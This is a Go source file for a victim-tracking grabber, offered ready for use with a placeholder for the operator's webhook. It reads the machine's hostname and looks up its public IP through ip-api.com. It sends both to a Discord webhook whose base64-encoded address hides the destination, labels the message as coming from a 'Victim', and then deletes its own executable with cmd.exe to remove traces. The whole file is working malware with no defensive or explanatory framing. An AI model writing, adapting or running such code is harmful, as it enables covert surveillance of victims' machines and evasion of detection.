package main

import (
	"encoding/base64"
	"encoding/json"
	"github.com/gtuk/discordwebhook"
	"io/ioutil"
	"log"
	"net/http"
	"os"
	"os/exec"
)

type IP struct {
	Query string
}

func grab() string {
	req, err := http.Get("http://ip-api.com/json/")
	if err != nil {
		return err.Error()
	}
	defer req.Body.Close()

	body, err := ioutil.ReadAll(req.Body)
	if err != nil {
		return err.Error()
	}

	var ip IP
	json.Unmarshal(body, &ip)

	return ip.Query
}

func data() {
	nm, _ := os.Hostname()
	var username = "Got an Victim From - "
	var content = "Machine Name : " + nm + "\n" +
		"IP Address : " + grab() + "\n"

	var rawDecodedText, err = base64.StdEncoding.DecodeString("PASTE UR BASE 64 ENCODED WEBHOOK HERE")

	message := discordwebhook.Message{
		Username: &username,
		Content:  &content,
	}

	err = discordwebhook.SendMessage(string(rawDecodedText), message)
	if err != nil {
		log.Fatal(err)
	}
}
func main() {
	data()
	cmd := exec.Command("cmd.exe", "/c", "del "+os.Args[0])
	cmd.Start()
}
